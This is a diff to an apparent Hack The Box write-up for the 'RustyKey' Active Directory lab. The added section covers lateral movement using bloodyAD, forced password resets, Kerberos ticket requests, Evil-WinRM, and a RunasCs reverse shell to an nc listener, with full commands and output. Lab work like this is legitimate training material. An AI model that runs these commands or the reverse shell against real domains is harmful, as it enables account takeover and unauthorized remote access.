@@ -442,7 +442,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] Saving ticket in IT-COMPUTER3.ccache
 
-root@kali:~# export KRB5CCNAME=IT-COMPUTER3\$.ccache
+root@kali:~# export KRB5CCNAME=IT-COMPUTER3.ccache
 ```
 
 ### 3.3. Add `IT-COMPUTER3` to `HELPDESK` group
@@ -482,14 +482,11 @@ That's because `bb.morgan` is a member of `IT` group, which is a member of `PROT
 
 ![](https://github.com/user-attachments/assets/c1a7443e-8fe0-48c7-8993-3c3d2f6df0fa)
 
-Let's remove both `SUPPORT` and `IT` groups from `PROTECTED OBJECTS` group:
+Remove `IT` group from `PROTECTED OBJECTS` group:
 
 ```console
 root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' IT
 [-] IT removed from PROTECTED OBJECTS
-
-root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' SUPPORT
-[-] SUPPORT removed from PROTECTED OBJECTS
 ```
 
 Getting TGT for `bb.morgan` works:
@@ -541,6 +538,146 @@ Warning: User is not needed for Kerberos auth. Ticket will be used
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\bb.morgan\Documents> type ..\Desktop\user.txt
 c089bcf4eb71d15e482fc826d35ff99a
+```
+
+## 4. Lateral movement to `ee.reed`
+
+### 4.1. Getting access to `ee.reed`
+
+There's an internal document found on `bb.morgan`'s desktop:
+
+```console
+*Evil-WinRM* PS C:\Users\bb.morgan> dir Desktop
+
+
+    Directory: C:\Users\bb.morgan\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         6/4/2025   9:15 AM           1976 internal.pdf
+-ar---         9/5/2025   8:36 PM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\bb.morgan> download Desktop/internal.pdf
+
+Info: Downloading C:\Users\bb.morgan\Desktop/internal.pdf to internal.pdf
+
+Info: Download successful!
+```
+
+It appears that the `SUPPORT` group can modify the registry and can test compression/decompression related functions:
+
+![](https://github.com/user-attachments/assets/7d848e6a-34cb-4ad1-8da2-f8f4091f0d7a)
+
+Recall that `ee.reed` is a member of `SUPPORT` group:
+
+![](https://github.com/user-attachments/assets/c1a7443e-8fe0-48c7-8993-3c3d2f6df0fa)
+
+And `HELPDESK` can ForceChangePAssword on `ee.reed`:
+
+![](https://github.com/user-attachments/assets/22612c40-bece-4446-9b45-f6e0a9fd0ab2)
+
+Remove `SUPPORT` group from `PROTECTED OBJECTS` group:
+
+```console
+root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'PROTECTED OBJECTS' SUPPORT
+[-] SUPPORT removed from PROTECTED OBJECTS
+```
+
+Reset password for `ee.reed`:
+
+```console
+root@kali:~# bloodyAD -k --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed Pass1234
+[+] Password changed successfully!
+```
+
+Get TGT for `ee.reed`:
+
+```console
+root@kali:~# impacket-getTGT rustykey.htb/ee.reed:Pass1234
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+[*] Saving ticket in ee.reed.ccache
+
+root@kali:~# export KRB5CCNAME=ee.reed.ccache
+```
+
+Connecting with `evil-winrm` doesn't work:
+
+```console
+root@kali:~# evil-winrm -i dc.rustykey.htb -u ee.reed -r rustykey.htb
+
+Evil-WinRM shell v3.7
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Warning: User is not needed for Kerberos auth. Ticket will be used
+
+Info: Establishing connection to remote endpoint
+
+Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Invalid token was supplied
+Success
+
+
+Error: Exiting with code 1
+malloc_consolidate(): unaligned fastbin chunk detected
+Aborted
+```
+
+### 4.2. RunasCs to switch user to `ee.reed`
+
+We have the credentials of `ee.reed` but `evil-winrm` didn't work, let's try to switch user with [RunasCs](https://github.com/antonioCoco/RunasCs)
+
+Prepare RunasCs:
+
+```console
+root@kali:~# curl -sLO https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
+
+root@kali:~# unzip RunasCs.zip
+Archive:  RunasCs.zip
+  inflating: RunasCs.exe
+  inflating: RunasCs_net2.exe
+```
+
+Upload `RunasCs.exe` in the `bb.morgan` session:
+
+```pwsh
+*Evil-WinRM* PS C:\Users\bb.morgan> upload RunasCs.exe
+
+Info: Uploading /root/RunasCs.exe to C:\Users\bb.morgan\RunasCs.exe
+
+Data: 68948 bytes of 68948 bytes copied
+
+Info: Upload successful!
+```
+
+Start a listener on Kali: `rlwrap nc -nlvp 4444`
+
+Execute:
+
+```pwsh
+*Evil-WinRM* PS C:\Users\bb.morgan> .\RunasCs.exe ee.reed Pass1234 cmd -r 10.10.14.3:4444
+[*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
+[*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
+
+[+] Running in session 0 with process function CreateProcessWithLogonW()
+[+] Using Station\Desktop: Service-0x0-1996d826$\Default
+[+] Async process 'C:\Windows\system32\cmd.exe' with pid 29688 created in background.
+```
+
+Reverse shell hooked as `ee.reed`:
+
+```cmd
+connect to [10.10.14.3] from (UNKNOWN) [10.10.11.75] 53121
+Microsoft Windows [Version 10.0.17763.7434]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+rustykey\ee.reed
 ```
 
 ## work-in-progress
